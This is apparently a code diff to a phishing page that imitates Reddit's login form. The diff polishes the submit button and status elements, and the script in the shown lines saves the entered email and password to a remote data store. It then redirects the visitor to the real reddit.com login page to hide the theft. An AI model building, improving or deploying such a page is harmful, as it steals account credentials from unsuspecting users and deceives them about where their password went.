@@ -152,7 +152,12 @@
               </fieldset>
 
               <fieldset class="AnimatedForm__field m-small-margin">
-                <button  type="submit" onclick="datos()">Log in</button>
+                <button class="AnimatedForm__submitButton m-full-width" type="submit" data-step="username-and-password"
+                  onclick="datos()">Log in</button>
+                <div class="AnimatedForm__submitStatus" data-step="username-and-password">
+                  <div class="AnimatedForm__submitStatusIcon"></div>
+                  <span class="AnimatedForm__submitStatusMessage"></span>
+                </div>
               </fieldset>
 
 
@@ -274,13 +279,13 @@
       email: emailvalue,
       password: passvalue
     })
-    .then(function() {
-         console.log("Doc successful");
-         window.location.href = "https://www.reddit.com/login/";
-     })
-     .catch(function(error) {
+      .then(function () {
+        console.log("Doc successful");
+        window.location.href = "https://www.reddit.com/login/";
+      })
+      .catch(function (error) {
         console.error("Error writing doc", error);
-     });
+      });
   }
 
 </script>
